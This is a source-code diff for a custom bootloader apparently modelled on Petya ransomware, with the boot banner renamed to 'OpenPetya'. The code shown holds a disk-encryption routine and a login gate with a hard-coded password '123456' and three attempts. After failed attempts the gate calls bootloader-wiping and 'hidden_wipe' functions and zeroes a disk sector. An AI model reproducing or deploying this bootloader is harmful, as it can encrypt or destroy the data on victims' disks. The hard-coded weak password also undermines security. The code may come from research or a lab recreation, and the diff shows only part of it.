@@ -3,14 +3,13 @@
 
 #include "bootloader.h"
 #include "io.h"
-#include "petya.h"
 #include "keyboard.h"
 #include "types.h"
-#include "ntfs.h"
 #include "utils.h"
 #include "ata.h"
 #include "state.h"
 #include "ntfs_crypt.h"
+#include "hidden_store.h"
 
 #define PASSWORD "123456"
 #define MAX_ATTEMPTS 3
@@ -285,7 +284,7 @@ void do_encryption(void)
     vga_clear();
 
     vga_set_color(COLOR_WHITE_ON_BLUE);
-    vga_puts("Secure boot, 1st stage.");
+    vga_puts("OpenPetya, 1st stage.");
     vga_set_color(COLOR_WHITE_ON_BLACK);
     vga_puts("\n\n");
 
@@ -362,7 +361,7 @@ void login(void)
     vga_clear();
 
     vga_set_color(COLOR_WHITE_ON_BLUE);
-    vga_puts("Secure Boot");
+    vga_puts("OpenPetya");
     vga_puts("\n\n");
 
     vga_set_color(COLOR_WHITE_ON_BLACK);
@@ -427,7 +426,7 @@ void login(void)
             wipe_out_bootloader();
             hidden_wipe();
 
-            uint32_t zero[512] = { 0 };
+            uint8_t zero[512] = { 0 };
             ata_write(63, 1, zero);
 
             vga_set_color(COLOR_GREEN_ON_BLACK);
@@ -451,9 +450,6 @@ void login(void)
 void bootloader_main(uint32_t boot_drive)
 {
     (void)boot_drive;
-
-    vga_clear();
-    vga_puts("HI\n");
 
     uint8_t s = state_read();
     if (s == STATE_NOT_SETUP)
